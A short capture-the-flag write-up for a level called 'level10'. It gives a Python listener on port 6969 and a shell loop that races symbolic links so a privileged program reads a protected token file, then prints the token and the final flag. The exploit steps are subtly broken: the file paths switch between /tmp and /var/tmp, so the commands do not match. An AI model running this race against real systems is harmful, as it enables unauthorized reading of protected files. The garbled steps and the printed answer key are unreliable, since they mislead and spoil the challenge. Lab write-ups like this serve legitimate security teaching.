HINT:
You need to create a server that can be used to retrieve the flag.

ANSWER:
when we first run level10 we see that we need to provide a file and a host, futhermore we see with strings that we need to make a server running on port 6969, so let's do that in python:
import socket
import sys

HOST = '0.0.0.0'
PORT = 6969

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        conn, addr = s.accept()
        print('Connected by', addr)
        while True:
            data = conn.recv(1024)
            if not data:
                break
            print(data)


if __name__ == '__main__':
    main()
Now let's try to run the program with ./level10 token 0.0.0.0:
You don't have access to token
Alright let's to make a symbolic link to the token file:
ln -fs /home/user/level10/token /tmp/fake
it still says that we dont have access to it therefore we need to trick it:
echo > /tmp/hack && while :; do ln -fs /var/tmp/hack /var/tmp/fake; ln -fs /home/user/level10/token /var/tmp/fake; done
This line will switch the symbolic link between two files, so we can trick the server to access the token file, then let's try to run the program:
./level10 /tmp/fake 0.0.0.0
we get:
woupa2yuojeeaaed06riuj63c
su flag10 and getflag:
feulo4b72j7edeahuete3no7c
